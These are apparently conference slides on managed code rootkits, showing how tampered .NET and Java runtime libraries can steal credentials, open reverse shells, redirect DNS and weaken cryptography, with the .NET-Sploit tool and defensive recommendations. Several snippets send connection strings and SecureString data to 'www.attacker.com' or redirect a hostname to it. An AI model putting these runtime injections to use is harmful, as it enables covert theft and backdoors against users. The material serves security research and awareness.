•
Public void KeyLogEventHandler (Event e)
• Will be used later on
Attacking the “Object” class
•
Object Oriented and inheritance play their role 
•
All classes automatically extend the class “Object”
• They inherit its member variables & methods
•
Object contains generic code that is shared among all the other 
objects
•
Injecting a new method to “Object” class will influence ALL 
existing classes
• Example: report current object variables to attacker
private void SendVariables(string attackerAddress)
Malware development scenarios
•
Changing a language class libraries can lead to some very 
interesting attacks
•
Code manipulation, API Hooking 
•
Authentication Backdoors
•
Sensitive data theft
•
Resource hiding (file,process,port…)
•
Covert Channels / reverse shells
•
Proxy (bouncer), DNS fixation, MitM..
•
Polymorphism attacks
•
Disabling security mechanisms
•
Remember, we are hiding it from apps running inside the 
sandbox, not from the OS
•
We are messing with the sandbox
•
Let’s talk about some examples…
Stealing authentication credentials
•
Stealing from inside of Authenticate() - used by all applications 
•
Send the credentials to the attacker url
• We can use our SendToUrl(), to send the info to the attacker
Post injected
Original code
Modified code(post injection)
DEMO 
Hooking into “FormsAuthentication::Autheticate()”   (.NET/Windows)  
Stealing credentials from all hosting apps login pages
http://www.RichBank.com/formsauthentication/Login.aspx
Victim
Authentication backdoors
•
Another attack on Authenticate() method  - authentication 
backdoors
•
Conditional authentication bypass
• Example – “MagicValue” (Disasm->Edit->Asm->Decomp):
Original 
code 
starts 
here
Injected 
code
Reverse Shell
•
Encoded version of netcat (MSIL array, dropandpop)
•
Deployed as public method+private class
•
Example – trigger - connect on Application::Run()
Pre injection
Original code
Modified code (pre injection)
Crypto attacks
•
Tampering with Cryptography libraries
• False sense of security
•
Some scenarios:
• Key fixation and manipulation 
• Key stealing (example -  SendToUrl(attacker,key) )
• Algorithm downgrading (AES -> DES, etc..) 
•
Example – GenerateKey() key fixation:
Modified
DNS manipulation
•
Manipulating DNS queries / responses
•
Example (Man-In-The-Middle)
•
Fixate the runtime DNS resolver to return a specific IP address, controlled 
by the attacker
• Dns::GetHostAddresses(string host)   (.NET)
• InetAddress::getByName(string host)  (Java)
•
All communication will be directed to attacker
•
Affects ALL network API methods
•
Example: resolve victim -> attacker
Injected code:
 public static InetAddress getByName(String s){ 
                         if(s.equals("www.ForexQuoteServer.com")) 
              s = "www.attacker.com";
                         return getAllByName(s)[0];
                     }
•
Modified classes are platform independent
•
We will deploy the same class used on Win on a linux machine
•
Forex Server
DEMO 
“InetAddress::getByName()”  conditional IP fixation  (JAVA/Linux)
BT4 Linux
www.attacker.com
www.ForexQuoteServer.com (local)
Stealing connection strings
•
Timing is everything
•
SqlConnection::Open() is responsible for opening DB 
connection
• “ConnectionString” variable contains the data
• Open() is called, ConnectionString is initialized
•
Send the connection string to the attacker
public override void Open()
{
SendToUrl(“www.attacker.com”, this.ConnectionString);
//original code starts here
//…..
}
Permanent HTML/JS injection
•
Malware does not necessary have to be injected into code 
sections
•
Tamper with hard-coded HTML/Javascript templates 
•
Inject permanent code into code templates
• Permanent XSS
• Proxies / Man-in-the-Middle
• Defacement
• Browser exploitation frameworks  
• Example – injecting a permanent call to XSS shell:
Pick into SecureString data
•
In-memory encrypted string for sensitive data usage (.NET)
• It probably contains valuable data !
•
Example – extract the data and send it to the attacker (decompiled):
IntPtr ptr = 
System.Runtime.InteropServices.Marshal.SecureStringToBSTR(secureString);
SendToUrl(“www.attacker.com”,
       System.Runtime.InteropServices.Marshal.PtrToStringBSTR(ptr));
Disabling security mechanisms
•
Java JAAS (Java Authentication & Authorization Service) / .NET CAS (Code 
Access Security) are responsible for runtime code authorizations
grant CodeBase "http://www.example.com", 
Principal com.sun.security.auth.SolarisPrincipal "duke" { permission 
java.io.FilePermission "/home/duke", "read, write"; 
}; 
•
Security logic manipulation
•
Example – messing with Demand() 
•
CodeAccessPermission,FileIOPermission, RegistryPermission,Principal… 
•
Effect - Applications will not behave according to declared policy 
settings
•
False sense of security (code seems to be restricted!!)
•
Configuration audit is useless
But those were just examples
•
The sky is the limit.
Advanced topics
•
Cross platform modified class can run on different platforms
•
“One class to rule them all, One class to find them, One class to 
bring them all and in the darkness bind them” 
•
What about other Runtimes?
•
ESB? Web Service stacks? Application Servers? Databases? 
SilverLight? PowerShell?
•
Their behavior can be changed
•
Multiple, chained rootkits / second order rootkits
1.
OS level rootkit covering up the traces of MCR (file size, 
signature..)
2.
VM level MCR covering its traces from the application
Automating the process with .NET-Sploit 1.0
• General purpose .NET DLL modification tool
• Able to perform all previous steps
• Extract target DLL from the GAC
• Perform complicated code modifications
• Generate GAC deployers
• Easy to extend by adding new code modules
• Can be used on linux using project mono
• Most of the discussed attacks have a .NET-Sploit PoC 
module implementation
.
NET-Sploit module concept
• Generic modules concept
• Function – a new method 
• Payload – injected code 
• Reference – external DLL reference
• Item – injection descriptor
• Comes with a set of predefined modules
• Check the documentation
Item example
change WriteLine() to print every string twice
 mscorlib.dll 
c:\WINDOWS\assembly\GAC_32\mscorlib\2.0.0.0__b77a5c561934e089
 writeline_twice.payload
 8 
 Post Append 
Injected Code
(payload/func)
Target
Hooking point
Mode (Pre / Post / Replace)
Location
Open a reverse shell to the attacker’s machine when a specific 
application (“SensitiveApplication.exe”) is executed
.NET-Sploit will inject the following code:
•
General purpose ReverseShell() method
•
Loader code - into the Framework “Run()” method
DEMO - .NET-Sploit 
Targeted reverse shell (.NET)  
Call for action
•
AV/HIPS vendors 
AV/HIPS vendors – Block Runtime tampering attempts 
•
IT
IT - File tampering detectors (external tripwire)
•
Auditors/testers
Auditors/testers – know about this malware hiding place
•
Forensics
Forensics – look for evidence inside the runtime VM
•
Developers
Developers – your app is secure as the underlying 
runtime VM
•
VM Vendors
VM Vendors – Although it’s not a bulletproof solution - 
Raise the bar. It’s too low! 
•
End users
End users – verify your Runtime libraries! 
References
•
More information can be obtained at 
http://www.applicationsecurity.co.il/Managed-Code-Rootkits.aspx
• Slides
• Whitepaper
• .NET-Sploit Tool & Source code
• .NET-Sploit PoC modules to described attacks
•
Ken Thompson, C compiler backdoors “Reflections on Trusting 
Trust” http://cm.bell-labs.com/who/ken/trust.html
•
Dinis Cruz, OWASP.NET, “the dangers of full trust applications” 
http://www.owasp.org/index.php/.Net_Full_Trust
Summary
•
Malicious code can be hidden inside an application runtime VM 
• It is an alternative place for malware deployment besides the 
Kernel, BIOS, Drivers, etc..
• It is an alternative place for backdoors 
•
Can lead to some very interesting attacks
•
It does not depend on specific vulnerability
•
It is not restricted only to Java or .NET
•
.NET-Sploit, a generic language modification tool, simplifies the 
process for .NET and it can be extended to other platforms
• But remember that .NET-Sploit is not necessary an evil tool. 
It can be used to create customized (“mod”) Frameworks…
Questions ?
Questions ?
Thank you !
Thank you !
PI:EMAIL
PI:EMAIL
Material can be found here:
Material can be found here:
http://www.applicationsecurity.co.il/Managed-Code-Rootkits.aspx